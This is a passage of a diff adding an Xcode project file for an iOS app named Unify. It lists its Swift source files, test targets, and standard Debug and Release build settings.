+				12CC7572253D9BBA00FE9B56 /* Unify_iOS.xcdatamodeld in Sources */,
+				12582CDD25470468004E12D6 /* HomeViewController.swift in Sources */,
+				1211D20425F373E10081CC21 /* MessagesViewController.swift in Sources */,
+				125129C5264C5E42003F678F /* RootViewController.swift in Sources */,
+				125DE3E2264DAF08007AAED8 /* UserDefaults+Extensions.swift in Sources */,
+				1258EFCF2646BCEA00C09271 /* Messages.swift in Sources */,
+				12A8BF1E2646D32A00A53597 /* ChatLogViewModel.swift in Sources */,
+				12D7DEF125F2D07C00366B3D /* PersistenceManager.swift in Sources */,
+				124C21FA25EE7834005E6A7F /* AvatarView.swift in Sources */,
+				12CC75A9253D9DC900FE9B56 /* UserLoginOptionsViewController.swift in Sources */,
+				120D2CC225570B8200C8E143 /* StudyYearData.swift in Sources */,
+				12582D152549D573004E12D6 /* Course.swift in Sources */,
+				1258EFC92646B3A700C09271 /* MessagesTableViewCell.swift in Sources */,
+				128DA0DC25E9929900CF8308 /* UnifyErrors.swift in Sources */,
+				12CC75C0253DA62600FE9B56 /* Strings.swift in Sources */,
+				125A103525974B4800FFFDA6 /* AccountManager.swift in Sources */,
+				12A8BF2E2646E01500A53597 /* ChatLogViewController.swift in Sources */,
+				125DE3D5264DAEBE007AAED8 /* UIView+Extensions.swift in Sources */,
+				128DA0E625E9932C00CF8308 /* UnifyTitleLabel.swift in Sources */,
+				125DE44A264DFAB3007AAED8 /* UnifyAlertView.swift in Sources */,
+				12D7DED625F154AD00366B3D /* UniversitySelectViewController.swift in Sources */,
+				1211D20925F373F40081CC21 /* MessagesViewModel.swift in Sources */,
+				12CC75D9253DB29B00FE9B56 /* UserLoginViewModel.swift in Sources */,
+				128BF068255326910010F731 /* SignUpViewModel.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		12CC7579253D9BBD00FE9B56 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				12BC6A5F2643610B00E5474A /* UsernameValidationTest.swift in Sources */,
+				12CC7582253D9BBD00FE9B56 /* EmailValidationTest.swift in Sources */,
+				12BC6A5426435D7300E5474A /* PasswordValidationTest.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		12CC7584253D9BBD00FE9B56 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				12CC758D253D9BBD00FE9B56 /* Unify_iOSUITests.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		12CC757F253D9BBD00FE9B56 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 12CC7563253D9BBA00FE9B56 /* Unify-iOS */;
+			targetProxy = 12CC757E253D9BBD00FE9B56 /* PBXContainerItemProxy */;
+		};
+		12CC758A253D9BBD00FE9B56 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 12CC7563253D9BBA00FE9B56 /* Unify-iOS */;
+			targetProxy = 12CC7589253D9BBD00FE9B56 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin XCBuildConfiguration section */
+		12CC758F253D9BBD00FE9B56 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		12CC7590253D9BBD00FE9B56 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		12CC7592253D9BBD00FE9B56 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 16DB7CC0BE87283A73F6FD39 /* Pods-Unify-iOS.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = "Unify-iOS/Unify-iOS.entitlements";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = 6ZGQ8R6GXK;
+				INFOPLIST_FILE = "Unify-iOS/Info.plist";
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = MelvinAsare.Unify;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		12CC7593253D9BBD00FE9B56 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 7C33D3DCEC65CE500E8F21EE /* Pods-Unify-iOS.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = "Unify-iOS/Unify-iOS.entitlements";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = 6ZGQ8R6GXK;
+				INFOPLIST_FILE = "Unify-iOS/Info.plist";
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = MelvinAsare.Unify;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+		12CC7595253D9BBD00FE9B56 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 9230842DCB67DC7D2240A446 /* Pods-Unify-iOSTests.debug.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = TU25L7DJ8L;
+				INFOPLIST_FILE = "Unify-iOSTests/Info.plist";
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "MelvinAsare.Unify-iOSTests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Unify-iOS.app/Unify-iOS";
+			};
+			name = Debug;
+		};
+		12CC7596253D9BBD00FE9B56 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = C7D5BAA3C1D23E5C50BF9924 /* Pods-Unify-iOSTests.release.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = TU25L7DJ8L;
+				INFOPLIST_FILE = "Unify-iOSTests/Info.plist";
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "MelvinAsare.Unify-iOSTests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Unify-iOS.app/Unify-iOS";
+			};
+			name = Release;
+		};
+		12CC7598253D9BBD00FE9B56 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 8A1993EA375901CFA01B32B7 /* Pods-Unify-iOS-Unify-iOSUITests.debug.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = TU25L7DJ8L;
+				INFOPLIST_FILE = "Unify-iOSUITests/Info.plist";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "MelvinAsare.Unify-iOSUITests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = "Unify-iOS";
+			};
+			name = Debug;
+		};
+		12CC7599253D9BBD00FE9B56 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 98513EEC6796D9A53229D2A1 /* Pods-Unify-iOS-Unify-iOSUITests.release.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = TU25L7DJ8L;
+				INFOPLIST_FILE = "Unify-iOSUITests/Info.plist";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "MelvinAsare.Unify-iOSUITests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = "Unify-iOS";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		12CC755F253D9BBA00FE9B56 /* Build configuration list for PBXProject "Unify-iOS" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				12CC758F253D9BBD00FE9B56 /* Debug */,
+				12CC7590253D9BBD00FE9B56 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		12CC7591253D9BBD00FE9B56 /* Build configuration list for PBXNativeTarget "Unify-iOS" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				12CC7592253D9BBD00FE9B56 /* Debug */,
+				12CC7593253D9BBD00FE9B56 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		12CC7594253D9BBD00FE9B56 /* Build configuration list for PBXNativeTarget "Unify-iOSTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				12CC7595253D9BBD00FE9B56 /* Debug */,
+				12CC7596253D9BBD00FE9B56 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		12CC7597253D9BBD00FE9B56 /* Build configuration list for PBXNativeTarget "Unify-iOSUITests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				12CC7598253D9BBD00FE9B56 /* Debug */,
+				12CC7599253D9BBD00FE9B56 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+
+/* Begin XCVersionGroup section */
+		12CC7570253D9BBA00FE9B56 /* Unify_iOS.xcdatamodeld */ = {
+			isa = XCVersionGroup;
+			children = (
+				12CC7571253D9BBA00FE9B56 /* Unify_iOS.xcdatamodel */,
+			);
+			currentVersion = 12CC7571253D9BBA00FE9B56 /* Unify_iOS.xcdatamodel */;
+			path = Unify_iOS.xcdatamodeld;
+			sourceTree = "<group>";
+			versionGroupType = wrapper.xcdatamodel;
+		};
+/* End XCVersionGroup section */
+	};
+	rootObject = 12CC755C253D9BBA00FE9B56 /* Project object */;
+}
